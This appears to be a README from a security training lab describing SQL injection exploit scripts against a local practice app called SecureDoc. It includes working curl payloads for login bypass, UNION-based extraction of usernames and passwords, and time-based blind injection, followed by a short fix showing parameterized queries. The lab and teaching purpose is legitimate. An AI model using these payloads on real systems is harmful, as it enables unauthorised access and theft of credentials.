# SecureDoc SQL Injection Exploits

## Overview
SQL Injection in SecureDoc's authentication, document access, and user management.

## Target Application
- **App**: SecureDoc
- **Port**: 5000
- **Vulnerability**: SQLi in multiple endpoints
- **Severity**: CRITICAL

## Available Exploits

### 1. auth_bypass_sqli.py
Authentication bypass via SQLi.

### 2. sqli_file_access.py
Use SQLi to read/write files.

### 3. time_based_blind_sqli.py
Time-based blind SQLi for data extraction.

**Usage**:
```bash
python auth_bypass_sqli.py http://localhost:5000
python sqli_file_access.py http://localhost:5000
python time_based_blind_sqli.py http://localhost:5000
```

## Exploitation Examples

```bash
# Auth bypass
curl -X POST http://localhost:5000/login \
  -d "username=admin' OR '1'='1'--&password=x"

# Data extraction
curl "http://localhost:5000/document?id=1 UNION SELECT username,password,NULL FROM users--"

# Time-based blind
curl "http://localhost:5000/search?q=' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--"
```

## Testing Steps

1. **Start SecureDoc**:
```bash
cd ../../projects/securedoc
docker-compose up -d
```

2. **Test SQLi**:
```bash
python auth_bypass_sqli.py http://localhost:5000
```

## Defense

**Vulnerable**:
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

**Fixed**:
```python
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

## Notes
**WARNING**: SQLi can lead to complete database compromise and RCE via xp_cmdshell or LOAD_FILE.

## Related
- See `../../ecomstore/sqli/` for login bypass
- See `../../chatapp/sqli/` for INSERT-based SQLi

## References
- OWASP SQLi: https://owasp.org/www-community/attacks/SQL_Injection
- SQLMap: https://sqlmap.org/
